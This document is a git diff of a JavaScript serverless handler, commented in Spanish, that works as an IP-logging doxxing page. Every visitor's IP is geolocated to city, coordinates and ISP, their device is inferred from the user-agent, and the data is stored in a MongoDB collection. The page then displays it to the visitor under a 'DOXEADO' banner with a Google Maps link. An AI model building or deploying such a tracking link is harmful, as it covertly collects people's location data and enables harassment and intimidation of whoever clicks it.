@@ -8,13 +8,26 @@ export default async function handler(req, res) {
     // 1. Obtención de la IP
     let ip = req.headers["x-forwarded-for"] || req.socket?.remoteAddress || "";
     if (ip.includes(",")) ip = ip.split(",")[0].trim();
-
-    // Fix local
     if (ip === "::1" || ip === "127.0.0.1") ip = "186.157.76.46"; 
 
-    // 2. Consulta API
+    // 2. Consulta API de Geolocalización
     const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,lat,lon,timezone,isp`);
     const geo = await geoRes.json();
+
+    // 3. Extraer Dispositivo de forma sencilla
+    const ua = req.headers["user-agent"] || "";
+    let dispositivo = "Desconocido";
+    if (ua.includes("iPhone")) dispositivo = "iPhone";
+    else if (ua.includes("Android")) dispositivo = "Android";
+    else if (ua.includes("Windows")) dispositivo = "PC (Windows)";
+    else if (ua.includes("Macintosh")) dispositivo = "Mac";
+    else if (ua.includes("Linux")) dispositivo = "Linux";
+
+    // 4. Formatear Fecha
+    const fechaActual = new Date().toLocaleString("es-AR", {
+      dateStyle: "long",
+      timeStyle: "short",
+    });
 
     const data = {
       ip,
@@ -24,13 +37,14 @@ export default async function handler(req, res) {
       lat: geo.lat || 0,
       lon: geo.lon || 0,
       isp: geo.isp || "N/A",
-      ua: req.headers["user-agent"]
+      dispositivo: dispositivo,
+      fecha: fechaActual
     };
 
-    // 3. Guardar en DB
-    await db.collection("ips").insertOne({ ...data, date: new Date() });
+    // 5. Guardar en DB
+    await db.collection("ips").insertOne({ ...data, date: new Date(), rawUA: ua });
 
-    // 4. RESPUESTA CON HTML Y CSS
+    // 6. RESPUESTA HTML/CSS
     res.setHeader("Content-Type", "text/html");
     return res.status(200).send(`
       <!DOCTYPE html>
@@ -38,70 +52,79 @@ export default async function handler(req, res) {
       <head>
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>Detalles de Conexión</title>
+        <title>Detalles de tu Conexión</title>
         <style>
           body { 
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
-            background-color: #0f172a; 
-            color: #f1f5f9; 
+            font-family: 'Inter', system-ui, -apple-system, sans-serif; 
+            background-color: #0b0f1a; color: #e2e8f0; 
             display: flex; justify-content: center; align-items: center; 
             min-height: 100vh; margin: 0; 
           }
           .card { 
-            background: #1e293b; border-radius: 16px; padding: 2rem; 
-            box-shadow: 0 10px 25px rgba(0,0,0,0.5); width: 90%; max-width: 450px; 
-            border: 1px solid #334155;
+            background: #161e2d; border-radius: 20px; padding: 2.5rem; 
+            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5); width: 90%; max-width: 400px; 
+            border: 1px solid #1e293b;
           }
-          h1 { color: #38bdf8; font-size: 1.5rem; margin-top: 0; }
-          .stat { margin-bottom: 1rem; border-bottom: 1px solid #334155; padding-bottom: 0.5rem; }
-          .label { font-size: 0.75rem; color: #94a3b8; text-transform: uppercase; letter-spacing: 0.05em; }
-          .value { font-size: 1.1rem; font-weight: 600; color: #f8fafc; }
-          .coords { display: flex; gap: 20px; }
+          .header { text-align: center; margin-bottom: 2rem; }
+          .header h1 { color: #60a5fa; margin: 0; font-size: 1.4rem; }
+          .header p { color: #64748b; font-size: 0.9rem; margin-top: 5px; }
+          
+          .stat { margin-bottom: 1.2rem; }
+          .label { font-size: 0.7rem; color: #64748b; text-transform: uppercase; font-weight: 700; }
+          .value { font-size: 1.05rem; color: #f1f5f9; margin-top: 2px; }
+          
+          .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
+          
           .map-btn {
-            display: inline-block; margin-top: 1rem; width: 100%; text-align: center;
-            background: #38bdf8; color: #0f172a; padding: 10px; border-radius: 8px;
-            text-decoration: none; font-weight: bold; transition: background 0.3s;
+            display: block; margin-top: 1.5rem; width: 100%; text-align: center;
+            background: #2563eb; color: white; padding: 12px; border-radius: 10px;
+            text-decoration: none; font-weight: 600; font-size: 0.9rem;
+            transition: all 0.2s ease; box-sizing: border-box;
           }
-          .map-btn:hover { background: #7dd3fc; }
+          .map-btn:hover { background: #3b82f6; transform: translateY(-2px); }
         </style>
       </head>
       <body>
+      <h1>DOXEADO</h1>
         <div class="card">
-          <h1>📍 Ubicación Detectada</h1>
+          <div class="header">
+            <h1>Acceso Registrado</h1>
+            <p>${data.fecha}</p>
+          </div>
           
+          <div class="stat">
+            <div class="label">Dispositivo detectado</div>
+            <div class="value">📱 ${data.dispositivo}</div>
+          </div>
+
           <div class="stat">
             <div class="label">Dirección IP</div>
             <div class="value">${data.ip}</div>
           </div>
 
           <div class="stat">
-            <div class="label">País / Región</div>
-            <div class="value">${data.country}, ${data.region}</div>
+            <div class="label">Ubicación</div>
+            <div class="value">📍 ${data.city}, ${data.country}</div>
           </div>
 
-          <div class="stat">
-            <div class="label">Ciudad</div>
-            <div class="value">${data.city}</div>
-          </div>
-
-          <div class="coords">
-            <div class="stat" style="flex:1">
+          <div class="grid">
+            <div class="stat">
               <div class="label">Latitud</div>
               <div class="value">${data.lat}</div>
             </div>
-            <div class="stat" style="flex:1">
+            <div class="stat">
               <div class="label">Longitud</div>
               <div class="value">${data.lon}</div>
             </div>
           </div>
 
           <div class="stat">
-            <div class="label">Proveedor (ISP)</div>
-            <div class="value">${data.isp}</div>
+            <div class="label">Proveedor de Internet</div>
+            <div class="value" style="font-size: 0.9rem;">${data.isp}</div>
           </div>
 
           <a href="https://www.google.com/maps?q=${data.lat},${data.lon}" target="_blank" class="map-btn">
-            Ver en Google Maps
+            Abrir ubicación en el Mapa
           </a>
         </div>
       </body>
@@ -109,6 +132,7 @@ export default async function handler(req, res) {
     `);
 
   } catch (err) {
-    return res.status(500).send("<h1>Error al procesar la solicitud</h1>");
+    console.error(err);
+    return res.status(500).send("Error del servidor");
   }
 }
